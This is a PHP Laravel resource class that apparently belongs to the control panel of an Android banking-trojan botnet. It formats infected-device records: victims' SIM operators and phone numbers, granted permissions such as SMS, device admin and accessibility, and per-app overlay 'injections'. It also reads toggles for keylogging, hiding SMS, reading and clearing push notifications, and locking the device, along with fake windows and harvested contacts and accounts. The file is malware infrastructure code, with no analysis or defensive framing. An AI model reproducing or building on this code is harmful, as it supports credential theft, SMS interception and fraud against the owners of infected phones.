<?php

namespace App\Http\Resources\Bot;

use App\Http\Resources\BaseResource;
use App\Models\BotLog;
use App\Models\UserBotTimestamp;
use Exception;
use Illuminate\Support\Collection;

class BotResource extends BaseResource
{
    public function toArray($request = null): array
    {
        $injects = [];

        /** @var Collection $logsApplication */
        $logsApplication = $this->logs->mapWithKeys(function (BotLog $log) {
            return [$log->application => $log->created_at?->format('Y-m-d H:i:s')];
        });

        /** @var Collection $userTimestampsApplications */
        $userTimestampsApplications = $this->userTimestamps->mapWithKeys(function (UserBotTimestamp $timestamp) {
            return [$timestamp->application => $timestamp->visited_at];
        });

        foreach ($this->botInjections as $botInject) {
            $count = false;
            $logsCurrentApplication = $logsApplication[$botInject->application] ?? null;

            if ($logsCurrentApplication) {
                $count = true;
                $userTimestampsCurrentApplication = $userTimestampsApplications[$botInject->application] ?? null;
                if ($userTimestampsCurrentApplication) {
                    $count = $logsCurrentApplication > $userTimestampsCurrentApplication;
                }
            }

            if ($botInject->injection) {
                $injects[] = [
                    'application' => $botInject->application,
                    'is_active' => $botInject->is_active,
                    'name' => $botInject->injection?->name,
                    'type' => $botInject->injection?->type,
                    'newData' => $count,
                ];
            }
        }

        try {
            $settings = [
                'hideSMS' => $this->settings['hideSMS'] === "1",
                'offSound' => $this->settings['offSound'] === "1",
                'readPush' => $this->settings['readPush'] === "1",
                'clearPush' => $this->settings['clearPush'] === "1",
                'keylogger' => $this->settings['keylogger'] === "1",
                'lockDevice' => $this->settings['lockDevice'] === "1",
                'arrayUrl' => $this->settings['arrayUrl'],
            ];
        } catch (Exception $e) {
            $settings = [];
        }

        return [
            'id' => $this->id,
            'ip' => $this->ip,
            'last_connection' => $this->updated_at?->format('Y-m-d H:i:s'), // $this->last_connection,
            'country' => config('countries')[strtoupper($this->country_code)] ?? 'Unknown',
            'country_code' => $this->country_code,
            'tag' => $this->tag,
            'update_settings' => $this->update_settings,
            'working_time' => $this->working_time,
            'sim_data' => [
                "operator" => $this->sim_data["operator"],
                "isDualSim" => $this->sim_data['isDualSim'] === "true",
                "operator1" => $this->sim_data["operator1"],
                "phone_number" => $this->sim_data["phone_number"],
                "phone_number1" => $this->sim_data["phone_number1"]
            ],
            'metadata' => $this->metadata,
            'permissions' => [
                "sms" => $this->permissions["sms"] === "true",
                "admin" => $this->permissions["admin"] === "true",
                "screen" => $this->permissions["screen"] === "true",
                "protect" => !($this->permissions["protect"] === ""),
                "is_dozemode" => $this->permissions["is_dozemode"] === "true",
                "accessibility" => $this->permissions["accessibility"] === "true",
                "isKeyguardLocked" => $this->permissions["isKeyguardLocked"] === "true"
            ],
            'settings' => $settings,
            'set_windows_fake' => $this->set_windows_fake,
            'set_hide_sms_list' => $this->set_hide_sms_list,
            'set_contact_list' => $this->set_contact_list === 1,
            'set_accounts' => $this->set_accounts === 1,
            'is_favorite' => $this->is_favorite,
            'is_blacklisted' => $this->is_blacklisted,
            'created_at' => $this->created_at?->format('Y-m-d H:i:s'),
            'updated_at' => $this->updated_at?->format('Y-m-d H:i:s'),
            'injections' => $this->relationLoaded('botInjections') ? $injects : [],
            'comment' => $this->comment,
        ];
    }
}
